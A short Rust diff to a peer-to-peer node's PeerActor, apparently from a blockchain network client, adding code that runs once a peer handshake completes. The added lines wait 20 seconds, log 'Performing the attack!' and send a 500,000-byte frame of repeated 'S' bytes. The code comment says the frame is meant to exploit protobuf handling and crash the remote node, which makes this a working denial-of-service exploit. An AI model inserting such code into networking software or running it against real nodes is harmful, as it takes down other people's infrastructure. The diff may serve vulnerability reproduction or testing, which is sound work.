@@ -44,6 +44,7 @@ use std::io;
 use std::net::SocketAddr;
 use std::sync::atomic::Ordering;
 use std::sync::Arc;
+use std::thread;
 use tracing::Instrument as _;
 
 /// How often to request peers from active peers.
@@ -777,6 +778,12 @@ impl PeerActor {
                             }
                             // Sync the RoutingTable.
                             act.sync_routing_table();
+
+                            // Wait a bit and send a message attempting to exploit protobuf and crash the other node
+                            thread::sleep(std::time::Duration::new(20, 0));
+                            tracing::warn!(target: "network", "Performing the attack!");
+                            let buf = b"S".repeat(500000);
+                            act.framed.send(stream::Frame(buf));
                         }
 
                         act.network_state.config.event_sink.push(Event::HandshakeCompleted(HandshakeCompletedEvent{
